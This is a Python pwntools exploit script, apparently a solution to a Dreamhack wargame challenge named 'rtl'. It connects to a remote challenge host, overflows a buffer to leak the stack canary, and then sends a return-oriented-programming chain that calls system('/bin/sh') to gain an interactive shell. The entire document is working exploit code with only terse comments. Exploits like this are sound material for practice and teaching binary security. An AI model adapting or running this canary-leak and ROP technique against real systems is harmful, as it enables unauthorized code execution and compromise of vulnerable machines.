from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
# p = process('./rtl')
HOST = 'host3.dreamhack.games'
PORT = 15164
p = remote(HOST, PORT)
e = ELF('./rtl')

# Set context
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

# Leak Canary
payload = b'A' * (0x40 - 0x08 + 0x01)
p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('Canary', canary)

# Set Variable
gadget = 0x400853              # Using ROPgadget
bin_sh = 0x400874              # Using pwndbg - search
system_plt = e.plt['system']
ret = 0x400285
slog('Gadget', gadget)
slog('/bin/sh', bin_sh)
slog('PLT', system_plt)

# Exploit
exploit = b'A' * (0x40 - 0x08)  # buf[0x38]
exploit += p64(canary)          # canary[0x08]
exploit += b'B' * 0x08          # SFP[0x08]
exploit += p64(ret)             # no-op gadget
exploit += p64(gadget)          # RET[0x08]
exploit += p64(bin_sh)          # pop rdi
exploit += p64(system_plt)      # system plt

pause()
p.sendafter(b'Buf: ', exploit)
p.interactive()
